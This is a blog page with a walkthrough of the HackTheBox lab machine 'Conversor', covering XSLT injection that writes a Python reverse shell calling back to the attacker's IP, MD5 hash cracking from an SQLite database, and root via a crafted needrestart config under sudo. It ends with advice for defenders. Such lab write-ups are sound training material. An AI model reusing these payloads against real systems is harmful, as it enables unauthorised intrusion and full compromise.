@@ -1,0 +1,563 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Conversor Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Conversor Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/posts/29/conversor.jpg"><meta property="og:image:width" content="225"><meta property="og:image:height" content="225"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Complete walkthrough of the HackTheBox Pentest Lab machine Conversor hackthebox Conversor is a Easy Linux machine centred around a file-conversion&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-conversor-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-conversor-walkthrough/"},"headline":"HackTheBox Conversor Walkthrough","datePublished":"2025-10-26T15:48+05:30","dateModified":"2026-09-30T19:57+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/posts/29/conversor.jpg","height":225,"width":225},"description":"Complete walkthrough of the HackTheBox Pentest Lab machine Conversor hackthebox Conversor is a Easy Linux machine centred around a file-conversion&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Conversor Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-10-26T15:48" class="feed__date">October 26, 2025</time></div></div></header><figure class="hero__image"><div class="hero__image-wrapper"><img src="https://h4ck3rfirst.github.io/media/posts/29/conversor.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-md.jpg 1024w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-lg.jpg 1366w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-xl.jpg 1600w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-2xl.jpg 1920w" sizes="88vw" loading="eager" height="225" width="225" alt=""></div></figure></div><div class="entry-wrapper content__entry"><p>Complete walkthrough of the HackTheBox Pentest Lab machine <strong>Conversor</strong> hackthebox</p><p>Conversor is a Easy Linux machine centred around a file-conversion web application that accepts user-supplied XML and XSLT files. The attack chain runs from <strong>XSLT Server-Side Injection → Remote Code Execution → Credential Extraction from SQLite → SSH login → sudo privilege escalation via needrestart</strong>.</p><hr><h2 id="table-of-contents">Table of Contents</h2><ol><li><a href="#1-reconnaissance">Reconnaissance</a></li><li><a href="#2-enumeration">Enumeration</a></li><li><a href="#3-foothold--xslt-injection-to-rce">Foothold — XSLT Injection to RCE</a></li><li><a href="#4-lateral-movement--cracking-credentials">Lateral Movement — Cracking Credentials</a></li><li><a href="#5-privilege-escalation--needrestart-sudo-abuse">Privilege Escalation — needrestart sudo Abuse</a></li><li><a href="#6-key-takeaways">Key Takeaways</a></li></ol><hr><h2 id="1-reconnaissance">1. Reconnaissance</h2><h3 id="port-scan">Port Scan</h3><pre><code class="language-bash">nmap -sCV --min-rate 5000 -v -T4 -p- conversor.htb
+</code></pre><h2 id="results--port--state--service--version-----22tcp--open--ssh--openssh-89p1-ubuntu---80tcp--open--http--apache-2452--only-two-ports-open--ssh-22-and-http-80-the-web-server-immediately-redirects-to-login--web-recon-no-subdomain-found-the-technology-of-website-by-using-wappalzer---web-servers-apache-http-server-2452-----operating-systems-ubuntu-----cdn-jsdelivr-----ui-frameworks-bootstrap-530-----nothing-special-or-any-cve-found"><strong>Results:</strong><br>| Port | State | Service | Version | |——|——-|———|———| | 22/tcp | open | SSH | OpenSSH 8.9p1 Ubuntu | | 80/tcp | open | HTTP | Apache 2.4.52 |<br>Only two ports open — SSH (22) and HTTP (80). The web server immediately redirects to <code>/login</code>.<br>### web recon<br>No subdomain found. The Technology of website by using wappalzer<br><strong>Web servers:</strong> Apache HTTP Server 2.4.52     <strong>Operating systems:</strong> Ubuntu     <strong>CDN:</strong> jsDelivr     <strong>UI frameworks:</strong> Bootstrap 5.3.0    <br>Nothing special or any CVE Found</h2><h2 id="2-enumeration">2. Enumeration</h2><h3 id="directory-brute-force">Directory Brute-Force</h3><pre><code class="language-bash">gobuster dir \
+  -u http://conversor.htb \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -t 50
+</code></pre><p><strong>Interesting findings:</strong></p><table><thead><tr><th>Path</th><th>Status</th><th>Notes</th></tr></thead><tbody><tr><td><code>/login</code></td><td>200</td><td>Login page</td></tr><tr><td><code>/register</code></td><td>200</td><td>Self-registration enabled</td></tr><tr><td><code>/about</code></td><td>200</td><td>Info page</td></tr><tr><td><code>/convert</code></td><td>405</td><td>File conversion endpoint (POST only)</td></tr><tr><td><code>/server-status</code></td><td>403</td><td>Forbidden</td></tr></tbody></table><h3 id="web-application-analysis">Web Application Analysis</h3><p>After registering and logging in, the application reveals a <strong>file conversion feature</strong> that accepts:</p><ul><li>An <strong>XML</strong> file (data input)</li><li>An <strong>XSLT</strong> stylesheet (data input)</li><li> (transformation template)</li></ul><p>The server transforms the XML using the XSLT and renders the output in-browser. This is a classic setup for <strong>XSLT Server-Side Injection</strong> and <strong>XML injection</strong>.</p><p>Two additional URLs were discovered during manual browsing:</p><pre><code>http://conversor.htb/static/source_code.tar.gz   ← Source code disclosure!
+http://conversor.htb/static/nmap.xslt             ← Sample XSLT template
+</code></pre><blockquote><p><strong>Pro Tip:</strong> Always look for exposed archives and example files. Source code disclosure can reveal internal paths, credentials, and logic flaws without touching the application itself.</p></blockquote><h3 id="xslt-functionality--proof-of-concept">XSLT Functionality — Proof of Concept</h3><p>To confirm the feature worked as expected, a sample XML matching the <code>nmap.xslt</code> schema was submitted:</p><pre><code class="language-nmap.xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;nmaprun args=&quot;nmap -sV -oX output.xml 10.0.0.5&quot;&gt;
+  &lt;host&gt;
+    &lt;status state=&quot;up&quot;/&gt;
+    &lt;address addr=&quot;10.0.0.5&quot; addrtype=&quot;ipv4&quot;/&gt;
+    &lt;hostnames&gt;
+      &lt;hostname name=&quot;target.local&quot;/&gt;
+    &lt;/hostnames&gt;
+    &lt;ports&gt;
+      &lt;port protocol=&quot;tcp&quot; portid=&quot;22&quot;&gt;
+        &lt;state state=&quot;open&quot;/&gt;
+        &lt;service name=&quot;ssh&quot;/&gt;
+      &lt;/port&gt;
+      &lt;port protocol=&quot;tcp&quot; portid=&quot;80&quot;&gt;
+        &lt;state state=&quot;open&quot;/&gt;
+        &lt;service name=&quot;http&quot;/&gt;
+      &lt;/port&gt;
+    &lt;/ports&gt;
+  &lt;/host&gt;
+&lt;/nmaprun&gt;
+</code></pre><p>and downlaod file <code>nmap.xslt</code> with <code>nmap.xml</code></p><p>The template rendered correctly — confirming the server-side XSLT processor was active and functional.</p><h2 id="image-description"><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/29/conversor-sample-test-2.png" alt="Image description" width="1133" height="545" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-sample-test-2-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-sample-test-2-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-sample-test-2-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-sample-test-2-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-sample-test-2-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/29/responsive/conversor-sample-test-2-2xl.png 1920w"></figure></h2><h2 id="3-foothold--xslt-injection-to-rce">3. Foothold — XSLT Injection to RCE</h2><h3 id="vulnerability-xslt-server-side-injection-via-exsldocument">Vulnerability: XSLT Server-Side Injection via <code>exsl:document</code></h3><p>XSLT 1.0 with the <strong>EXSLT extension</strong> (<code>http://exslt.org/common</code>) supports a <code>&lt;exsl:document&gt;</code> element that can <strong>write arbitrary files to the filesystem</strong>. If the XSLT processor runs as <code>www-data</code> and there is a directory writable by that user that is also executed by a scheduled job or process, arbitrary code execution follows.</p><h4 id="step-1--write-a-reverse-shell-via-xslt-and-xml">Step 1 — Write a Reverse Shell via XSLT and xml</h4><p>The following XSLT writes a Python reverse shell to a path discovered through source code review:</p><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;
+  xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+  xmlns:exsl=&quot;http://exslt.org/common&quot;
+  extension-element-prefixes=&quot;exsl&quot;&gt;
+  &lt;xsl:output method=&quot;html&quot; encoding=&quot;UTF-8&quot;/&gt;
+  &lt;xsl:template match=&quot;/&quot;&gt;
+    &lt;exsl:document href=&quot;/var/www/conversor.htb/scripts/xpl.py&quot; method=&quot;text&quot;&gt;
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.10.16.165&quot;,4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty; pty.spawn(&quot;sh&quot;)
+    &lt;/exsl:document&gt;
+    &lt;html&gt;&lt;body&gt;&lt;h2&gt;Exploit succeeded&lt;/h2&gt;&lt;p&gt;Check listener&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre><p>or</p><pre><code class="language-xslt">  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;
+  xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+  xmlns:exsl=&quot;http://exslt.org/common&quot;
+  extension-element-prefixes=&quot;exsl&quot;&gt;
+  &lt;xsl:output method=&quot;html&quot; encoding=&quot;UTF-8&quot;/&gt;
+
+  &lt;xsl:template match=&quot;/&quot;&gt;
+    &lt;!-- Drop a Python reverse shell into the cron-monitored scripts/ folder --&gt;
+    &lt;exsl:document href=&quot;/var/www/conversor.htb/scripts/xpl.py&quot; method=&quot;text&quot;&gt;
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.10.16.165&quot;,4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty; pty.spawn(&quot;sh&quot;)
+    &lt;/exsl:document&gt;
+
+    &lt;!-- Visible output to confirm transform ran --&gt;
+    &lt;html&gt;&lt;body&gt;&lt;h2&gt;Exploit succeeds&lt;/h2&gt;&lt;p&gt;Check listener&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre><blockquote><p><strong>Why <code>/var/www/conversor.htb/scripts/</code>?</strong> The source code (obtained from the archive above) revealed a cron job or internal mechanism that executes Python scripts from this directory. Any <code>.py</code> file written there gets executed automatically within about 60 seconds.</p></blockquote><h4 id="step-2--start-a-listener">Step 2 — Start a Listener</h4><pre><code class="language-bash">rlwrap nc -lvnp 4444
+</code></pre><h4 id="step-3--upload-the-malicious-xslt">Step 3 — Upload the Malicious XSLT</h4><p>Submit any valid XML with the malicious XSLT through the convert endpoint. Wait approximately 60 seconds for the cron-triggered execution.</p><h4 id="result">Result</h4><pre><code>listening on [any] 4444 ...
+connect to [10.10.16.165] from (UNKNOWN) [10.129.238.31] 57506
+
+$ whoami
+www-data
+</code></pre><h2 id="shell-obtained-as-www-data">shell obtained as <code>www-data</code>.</h2><h2 id="4-lateral-movement--cracking-credentials">4. Lateral Movement — Cracking Credentials</h2><h3 id="sqlite-database">SQLite Database</h3><p>With a shell as <code>www-data</code>, the application’s SQLite database is accessible:</p><pre><code class="language-bash">www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
+</code></pre><pre><code class="language-sql">.tables
+-- files  users
+ 
+SELECT * FROM users;
+-- 1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+-- 5|test|ac1db8959b49e29b3c780d667c7566cc
+</code></pre><p>Two users with <strong>MD5 hashes</strong>. MD5 is an insecure hashing algorithm and these can be cracked instantly.</p><figure class="post__image"><img loading="lazy" src="https://h4ck3rfirst.github.io/media/posts/29/Hashesdecode.png" alt="Image description" width="1302" height="569" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://h4ck3rfirst.github.io/media/posts/29/responsive/Hashesdecode-xs.png 640w, https://h4ck3rfirst.github.io/media/posts/29/responsive/Hashesdecode-sm.png 768w, https://h4ck3rfirst.github.io/media/posts/29/responsive/Hashesdecode-md.png 1024w, https://h4ck3rfirst.github.io/media/posts/29/responsive/Hashesdecode-lg.png 1366w, https://h4ck3rfirst.github.io/media/posts/29/responsive/Hashesdecode-xl.png 1600w, https://h4ck3rfirst.github.io/media/posts/29/responsive/Hashesdecode-2xl.png 1920w"></figure><h3 id="cracking-the-hash">Cracking the Hash</h3><pre><code>5b5c3ac3a1c897c94caad48e6c71fdec → Keepmesafeandwarm
+</code></pre><blockquote><p>** Credential found:** <code>fismathack : Keepmesafeandwarm</code></p></blockquote><h3 id="ssh-login">SSH Login</h3><pre><code class="language-bash">ssh fismathack@conversor.htb
+# Password: Keepmesafeandwarm
+</code></pre><pre><code>fismathack@conversor:~$ ls
+user.txt
+fismathack@conversor:~$ wc -c user.txt
+33 user.txt
+</code></pre><p><strong>User flag captured.</strong></p><hr><h2 id="5-privilege-escalation--needrestart-sudo-abuse">5. Privilege Escalation — needrestart sudo Abuse</h2><h3 id="enumeration">Enumeration</h3><pre><code class="language-bash">sudo -l
+</code></pre><p>Output reveals:</p><pre><code>(ALL) NOPASSWD: /usr/sbin/needrestart
+</code></pre><p>The user can run <code>needrestart</code> as root without a password.</p><h3 id="what-is-needrestart">What is needrestart?</h3><p><code>needrestart</code> is a utility that checks which services need restarting after library upgrades. It supports a <code>-c &lt;cfg&gt;</code> flag to <strong>load a custom configuration file</strong>.</p><h3 id="exploitation">Exploitation</h3><p>Inspecting <code>needrestart</code>‘s Perl-based config format, it supports an <code>exec</code> directive that runs an arbitrary command. This is the vector:</p><pre><code class="language-bash"># Write a malicious config that spawns a privileged shell
+echo &#39;exec &quot;/bin/bash&quot;, &quot;-p&quot;;&#39; &gt; /tmp/root.conf
+ 
+# Run needrestart with our config as root
+sudo /usr/sbin/needrestart -c /tmp/root.conf
+</code></pre><pre><code>root@conversor:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@conversor:/tmp# wc -lc /root/root.txt
+ 1 33 /root/root.txt
+</code></pre><p><strong>Root flag captured.</strong></p><hr><h2 id="6-key-takeaways">6. Key Takeaways</h2><h3 id="vulnerabilities-exploited">Vulnerabilities Exploited</h3><table><thead><tr><th>Step</th><th>Vulnerability</th><th>Impact</th></tr></thead><tbody><tr><td>Initial Access</td><td>XSLT EXSLT <code>exsl:document</code> file write</td><td>Remote Code Execution</td></tr><tr><td>Credential Access</td><td>MD5 password hashing + plaintext-equivalent SQLite storage</td><td>Credential Disclosure</td></tr><tr><td>Privilege Escalation</td><td>Unrestricted <code>sudo</code> on <code>needrestart</code> with custom config</td><td>Full Root Compromise</td></tr></tbody></table><h3 id="lessons-for-defenders">Lessons for Defenders</h3><p><strong>1. Disable dangerous XSLT extensions server-side.</strong> If using libxslt or similar, disable EXSLT extensions or apply a strict whitelist of permitted XSLT functions. Avoid allowing user-uploaded stylesheets to execute against a privileged XSLT processor.</p><p><strong>2. Use strong, salted password hashing.</strong> MD5 is not a password hashing algorithm. Use <code>bcrypt</code>, <code>argon2id</code>, or <code>scrypt</code> with a per-user salt. An attacker who reads your database should not be able to recover plaintext passwords.</p><p><strong>3. Audit sudo rules carefully.</strong> Granting <code>NOPASSWD</code> sudo to any utility that accepts user-controlled input files (configs, scripts) is high risk. In this case, <code>needrestart -c</code> allows arbitrary Perl code execution as root. Apply the principle of least privilege and restrict sudo to only the exact operations required.</p><p><strong>4. Do not expose source code archives.</strong> The <code>/static/source_code.tar.gz</code> endpoint revealed internal paths, the scripts directory, and application structure — dramatically lowering the bar for exploitation.</p><hr><h2 id="attack-path-summary">Attack Path Summary</h2><pre><code>[Unauthenticated]
+      │
+      ▼
+Register account → Login
+      │
+      ▼
+Upload malicious XSLT (exsl:document write)
+      │
+      ▼
+Cron executes written Python script
+      │
+      ▼
+Shell as www-data
+      │
+      ▼
+Read SQLite DB → Extract MD5 hash → Crack hash
+      │
+      ▼
+SSH as fismathack (user.txt ✓)
+      │
+      ▼
+sudo needrestart -c /tmp/root.conf
+      │
+      ▼
+Root shell (root.txt ✓)
+</code></pre><hr><p><em>Writeup by h4ck3rfirst · HackTheBox · Conversor</em></p></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/conversorhtb/">conversor.htb</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cracking/">cracking</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/">CTF Writeups</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/injection/">injection</a></li><li><a href="https://h4ck3rfirst.github.io/tags/needrestart/">needrestart</a></li><li><a href="https://h4ck3rfirst.github.io/tags/sudo/">sudo</a></li><li><a href="https://h4ck3rfirst.github.io/tags/xml/">xml</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-conversor-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Conversor%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-conversor-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Conversor%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-conversor-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/overthewire-natas-level-1-20/" class="content__nav-link" rel="prev"><div><span>Previous</span> overthewire-natas-level 1-20</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/hackthebox-giveback-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> HackTheBox Giveback Walkthrough</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-06-14T18:39" class="feed__date">June 14, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/">Tryhackme Mr robot Walkthrough</a></h3></header><p>Welcome to the walkthrough of the Robot room on TryHackMe, inspired by the Mr. Robot TV series. This lab focuses&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
